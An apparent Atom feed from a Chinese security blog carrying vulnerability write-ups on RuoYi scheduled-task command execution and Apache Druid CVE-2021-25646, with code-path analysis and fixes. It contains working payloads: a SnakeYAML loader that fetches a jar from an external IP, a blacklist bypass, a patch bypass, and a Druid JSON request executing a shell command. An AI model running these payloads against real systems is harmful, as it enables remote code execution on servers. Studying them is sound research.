<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Home</title>
  
  
  <link href="https://pety404.github.io/atom.xml" rel="self"/>
  
  <link href="https://pety404.github.io/"/>
  <updated>2022-05-27T08:22:41.140Z</updated>
  <id>https://pety404.github.io/</id>
  
  <author>
    <name>pety</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>若依定时任务命令执行漏洞分析</title>
    <link href="https://pety404.github.io/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://pety404.github.io/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-05-19T11:04:19.000Z</published>
    <updated>2022-05-27T08:22:41.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>​RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），提供了三种版本，Vue分离、不分离及微服务版本，官网：<a href="http://www.ruoyi.vip/%E3%80%82">http://www.ruoyi.vip/。</a></p><p>​定时任务是若依提供的默认功能，通过添加定时任务处理类（支持<code>Bean</code>调用、<code>Class</code>类调用）即可调度执行对应的方法，如com.ruoyi.quartz.task.RyTask.ryParams(‘ry’)。如果输入的是java.lang.Runtime.getRuntime().exec(“”)，那就有可能达到命令执行目的。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>版本：RuoYi-Vue 3.7.0</p><p>部署教程：<a href="http://doc.ruoyi.vip/ruoyi-vue/document/hjbs.html">http://doc.ruoyi.vip/ruoyi-vue/document/hjbs.html</a></p><p>若依定时任务提供调用类方法的能力，但是需要满足一定条件</p><ul><li>构造方法无参</li><li>构造方法和调用的方法均为 public</li></ul><p>snakeyaml满足以上条件且可以代码执行</p><p>payload：<code>org.yaml.snakeyaml.Yaml.load(&#39;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http&#39;://100.8.6.108:8000/yaml-payload.jar&quot;]]]]&#39;)</code></p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220520105235759.png" alt="image-20220520105235759"></p><p>yaml-payload.jar：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220520105923372.png" alt="image-20220520105923372"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本质：不安全的JAVA反射，外部输入可控实例化类，在定时任务功能触发。</p><p><strong>1.新增定时任务</strong></p><p>语句不能包含rmi:&#x2F;&#x2F;、ldap:&#x2F;&#x2F;、http:&#x2F;&#x2F;、https:&#x2F;&#x2F;字符，但是后续执行的时候会去掉参数的单引号，因此可以用rmi’:&#x2F;&#x2F;绕过</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527110054122.png" alt="image-20220527110054122"></p><p>往sys_job表插入任务记录，QRTZ_TRIGGERS保存触发器信息表。</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527110918693.png" alt="image-20220527110918693"></p><p><strong>2.任务触发执行</strong></p><p><a href="http://192.168.52.128:8073/prod-api/monitor/job/run">http://192.168.52.128:8073/prod-api/monitor/job/run</a></p><p>com.ruoyi.quartz.controller.SysJobController#run –》 com.ruoyi.quartz.service.impl.SysJobServiceImpl#run</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526192240036.png" alt="image-20220526192240036"></p><p>scheduler.triggerJob调用了开源任务调度器Quartz组件的api，表示立即执行任务。它根据jobId和jobGroup生成的JobKey去QRTZ_TRIGGERS查询需要执行的jobDetail。job_class_name列是定时任务的JobDetail。</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526200425373.png" alt="image-20220526200425373"></p><p>从上表可以看出定时任务会去执行com.ruoyi.quartz.util.QuartzDisallowConcurrentExecution类，跟进这个类，该类继承AbstractQuartzJob的execute方法。com.ruoyi.quartz.util.QuartzDisallowConcurrentExecution#execute–》com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob)</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526201759068.png" alt="image-20220526201759068"></p><p>beanName获取类名，methodName获取方法名，methodParams获取方法参数，重点看下获取参数。取(、)作为methodStr，同时去掉单引号。</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527100321055.png" alt="image-20220527100321055"></p><p> Object bean &#x3D; Class.forName(beanName).newInstance();   #实例化类对象的⽅法</p><p> invokeMethod(bean, methodName, methodParams); #执行函数</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527101154919.png" alt="image-20220527101154919"></p><p>反射的类、方法、参数是可控的，基于以上分析：</p><p>1.class.newInstance() 的作用是调用这个类的无参构造函数，所以我们传入的类必须要存在无参构造函数</p><p>2.getDeclaredMethod获取方法，只能是public、protected，因为没有禁用安全检查，不能调用private方法。</p><p>3.参数类型只能是String&#x2F;int&#x2F;long&#x2F;double&#x2F;boolean</p><p><strong>3.POC分析</strong></p><p>snakeyaml有类满足以上要求且可以命令执行，直接上snakeyaml反序列化的payload。</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527161655095.png" alt="image-20220527161655095"></p><p>POC是从远程URL加载jar包，有可能存在不出网的情况，可以使用file协议获取本地jar。网上公开绕过方法是修改上传文件的绝对路径，但这样会导致图片无法正常加载，需要谨慎操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.ruoyi.common.config.RuoYiConfig.setProfile(&#x27;/upload&#x27;)</span><br><span class="line"></span><br><span class="line">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file://上传的绝对路径&quot;]]]]&#x27;)</span><br></pre></td></tr></table></figure><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>新增时对目标字符串进行黑白名单限制</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142712071.png" alt="image-20220527142712071"></p><p>不允许包含以下字符串：</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142821020.png" alt="image-20220527142821020"></p><p>包含com.ruoyi字符串</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142924365.png" alt="image-20220527142924365"></p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527143008138.png" alt="image-20220527143008138"></p><p>以上修复方式是存在缺陷的，只对count&gt;1的className进行白名单检查，调用spring的bean对象则可以绕过</p><p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527154459459.png" alt="image-20220527154459459"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;​		RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shi</summary>
      
    
    
    
    <category term="代码审计" scheme="https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache Druid命令执行漏洞(CVE-2021-25646)</title>
    <link href="https://pety404.github.io/2022/05/19/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/"/>
    <id>https://pety404.github.io/2022/05/19/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/</id>
    <published>2022-05-19T03:30:35.000Z</published>
    <updated>2022-05-19T03:56:15.288Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Druid是JAVA编写的高性能实时分析型数据库，在即时数据可见性、运营分析以及高并发等方面表现非常出色。Apache Druid能够执行嵌入在各种类型的请求中的用户提供的JavaScript代码，默认情况下该功能是禁用的。但在Druid 0.20.0及之前的版本中，不管该功能是否启用，经过认证的用户可以发送恶意请求来使Druid强制运行该请求中的JavaScript代码，成功在目标系统上执行代码。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><strong>影响版本</strong>：Apache Druid &lt; 0.20.1</p><p>本次复现采用Apache Druid 0.19.0</p><p><code>wget https://archive.apache.org/dist/druid/0.19.0/apache-druid-0.19.0-bin.tar.gztar -xzvf apache-druid-0.19.0-bin.tar.gzcd apache-druid-0.19.0./bin/start-micro-quickstart</code></p><p>启动后服务绑定在8888端口,默认没有授权认证</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps29.jpg" alt="img"> </p><p>点击load data,抓到以下数据包，放入新建文件exp，进入部署目录发现文件新建成功。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps30.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/image-20220519115441576.png" alt="image-20220519115441576"></p><p><code>&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https://xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;touch aaa.txt&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</code></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>默认情况下，JavaScript是禁用的，但是可以通过设置configuration属性来启用:druid.javascript.enabled &#x3D; true，所以这个漏洞关键点就是如何开启druid.javascript.enabled。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps32.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps33.jpg" alt="img"> </p><p>可以看到通过enabled来控制是否开启，那我们只要找到哪些地方可以控制，就可以利用。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps34.jpg" alt="img"> </p><p>type 为 javascript 时指定对象为 <code>JavaScriptDimFilter</code> </p><p>@JsonCreator用于在json反序列化时指明调用特定构造方法。</p><p>@JsonProperty用于属性上，作用是把该属性的名称序列化为另外一个名称，比如@JsonProperty(“before”) String after，会将json里key为before的内容解析到after变量上。</p><p>@JacksonInject 当用户没有对应字段时，相应附上默认值。</p><p>即当反序列化JavaScriptDimFilter对象时，JavaScriptDimFilter会调用@JsonCreator注解的构造方法，当注解@JsonCreator修饰方法时，方法的所有参数都会被解析成CreatorProperty类型，如果属性没有被@JsonProperty修饰，就会创建一个name为””的CreatorProperty，Jackson会将用户输入的key为””的value赋值给该属性。</p><p>构造””: { “enabled”: true }去开启javascript enabled。</p><p>下面我们开始跟进一下数据流</p><p>开启 Apache Druid 的 debug 模式，需要设置 Apache Druid 的启动参数，设置文件 <code>apache-druid-0.19.0/conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.config</code> 在其中添加 java debug 的参数</p><p>-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;192.168.45.128:5005 </p><p>注意address，网上教程全部是address&#x3D;5005，监听IP是127.0.0.1，但是咱们部署在虚拟机，导致主机IDEA无法连接，所以要加上IP，这块是个坑。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps35.jpg" alt="img"> </p><p>-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps36.jpg" alt="img"> </p><p>Druid用到了jackson反序列化，在pom.xml加上依赖</p><p><dependencies>  <dependency>    <groupId>com.fasterxml.jackson.core</groupId>    <artifactId>jackson-core</artifactId>    <version>2.9.0</version>  </dependency>  <dependency>    <groupId>com.fasterxml.jackson.core</groupId>    <artifactId>jackson-databind</artifactId>    <version>2.9.0</version>  </dependency>  <dependency>    <groupId>com.fasterxml.jackson.core</groupId>    <artifactId>jackson-annotations</artifactId>    <version>2.9.0</version>  </dependency>  </dependencies></p><p>com.fasterxml.jackson.databind.deser.BeanDeserializer#_deserializeUsingPropertyBased解析用户输入，用</p><p>json串中的“键名”去查找当前解析对象中对应的creatorProperty</p><p>遍历json串，取出属性名放到_propertyLookup数组</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps37.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps38.jpg" alt="img"> </p><p>接下来开始遍历_propertyLookup数组，在</p><p>com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer#_deserializeTypedForId,根据type获取反序列化类进行参数赋值。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps39.jpg" alt="img"> </p><p>调试重复走这几个过程，我们step out快速到transformSpec的处理逻辑，根据type判断是javascript，反序列化javascriptdimfilter类对象，其中javascriptconfig参数因为没有被@JsonProperty修饰，取了键名” ”的值。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps40.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps41.jpg" alt="img"> </p><p>所以绕过了JavaScriptconfig检查，成功执行js代码，其中js代码支持调用java函数，所以可以调用系统命令。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/image-20220519115614355.png" alt="image-20220519115614355"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.升级到Apache Druid 0.20.1。</p><p>&#x2F;&#x2F;org.apache.druid.guice.GuiceAnnotationIntrospector @Override public JsonIgnoreProperties.Value findPropertyIgnorals(Annotated ac) {  if (ac instanceof AnnotatedParameter) {   final AnnotatedParameter ap &#x3D; (AnnotatedParameter) ac;   if (ap.hasAnnotation(JsonProperty.class)) {    return JsonIgnoreProperties.Value.empty();   }  }   return JsonIgnoreProperties.Value.forIgnoredProperties(“”); }</p><p>当属性被@JsonProperty修饰，则允许为空，如果属性没有被@JsonProperty修饰，则不允许为空。JavaScriptConfig被调用点的参数都没有被@JsonProperty修饰，因此不接受空键值，杜绝了用户输入。</p><p>2.加强访问控制，禁止未授权用户访问web管理页面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;Apache Druid是JAVA编写的高性能实时分析型数据库，在即时数据可见性、运营分析以及高并发等方面表现非常出色。Ap</summary>
      
    
    
    
    <category term="代码审计" scheme="https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>freemarker模板注入SSTI</title>
    <link href="https://pety404.github.io/2022/05/17/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/"/>
    <id>https://pety404.github.io/2022/05/17/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/</id>
    <published>2022-05-17T02:11:00.410Z</published>
    <updated>2022-05-19T03:29:29.059Z</updated>
    
    
    
    
    <category term="代码审计" scheme="https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
</feed>
